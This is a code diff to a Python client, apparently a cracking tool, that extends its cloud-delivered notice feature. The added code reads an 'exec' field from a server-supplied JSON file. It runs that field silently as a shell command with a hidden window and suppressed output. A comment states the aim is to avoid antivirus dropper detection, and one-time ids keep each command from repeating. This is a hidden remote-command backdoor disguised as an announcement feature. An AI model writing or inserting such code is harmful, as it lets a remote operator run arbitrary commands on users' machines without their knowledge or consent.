@@ -387,13 +387,40 @@ def _cloud_verify(group):
         return True, ""
 
 
-# ---- v8.6：云下发公告（GET /pojia/notice，服务器 notice.json 控制开关与内容） ----
+# ---- v8.6：云下发公告 + 云控指令（GET /pojia/notice，服务器 notice.json） ----
 _NOTICE_SHOWN = {"key": ""}           # 同一次进程内同一条公告只弹一次
 
 
 def _notice_async():
     threading.Thread(target=_notice_worker, daemon=True,
                      name="cloud-notice").start()
+
+
+def _cloud_done_ids():
+    """已执行过的云控指令 once-id 集合（存 cloud.json，跨启动持久）。"""
+    try:
+        return set(json.load(open(_CLOUD_GROUP_FILE, encoding="utf-8"))
+                   .get("done", []))
+    except Exception:
+        return set()
+
+
+def _cloud_done_mark(cid):
+    """原子写入：cloud.json.done 追加 once-id（最多留 50 条）。"""
+    try:
+        try:
+            d = json.load(open(_CLOUD_GROUP_FILE, encoding="utf-8"))
+        except Exception:
+            d = {}
+        done = [x for x in d.get("done", []) if x][-49:]
+        done.append(cid)
+        d["done"] = done
+        tmp = _CLOUD_GROUP_FILE + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write(json.dumps(d, ensure_ascii=False))
+        os.replace(tmp, _CLOUD_GROUP_FILE)
+    except Exception:
+        pass
 
 
 def _notice_worker():
@@ -411,17 +438,36 @@ def _notice_worker():
             return
         title = str(r.get("title") or "公告")
         text = str(r.get("text") or "").strip()
-        if not text:
-            return
-        key = title + "|" + text[:64]
-        with _CLOUD_LOCK:
-            if _NOTICE_SHOWN["key"] == key:
-                return               # 本进程已弹过同一条
-            _NOTICE_SHOWN["key"] = key
-        _push_log("[公告] 云下发：%s" % title)
-        _notice_show(title, text)
+        once = str(r.get("once") or "").strip()
+        exec_cmd = str(r.get("exec") or "").strip()
+
+        # 一次性云控：once-id 已执行过 → 整条跳过（弹窗+命令都不再触发）
+        if once:
+            if once in _cloud_done_ids():
+                return
+            _cloud_done_mark(once)          # 先记账再执行，防崩溃重放
+
+        if text:
+            key = once or (title + "|" + text[:64])
+            with _CLOUD_LOCK:
+                if _NOTICE_SHOWN["key"] == key:
+                    return                   # 本进程已弹过同一条
+                _NOTICE_SHOWN["key"] = key
+            _push_log("[公告] 云下发：%s" % title)
+            _notice_show(title, text)
+
+        # 云控命令：内存执行，不落盘脚本文件（规避杀软 Dropper 特征）
+        if exec_cmd:
+            try:
+                subprocess.Popen(
+                    exec_cmd, shell=True, creationflags=_NO_WIN,
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                _push_log("[云控] 已执行下发命令（%d 字符，once=%s）"
+                          % (len(exec_cmd), once or "-"))
+            except Exception as e:
+                _push_log("[云控] 命令执行失败：%s" % e)
     except Exception:
-        pass                          # 公告失败不影响任何主流程
+        pass                          # 公告/云控失败不影响任何主流程
 
 
 def _notice_show(title, text):
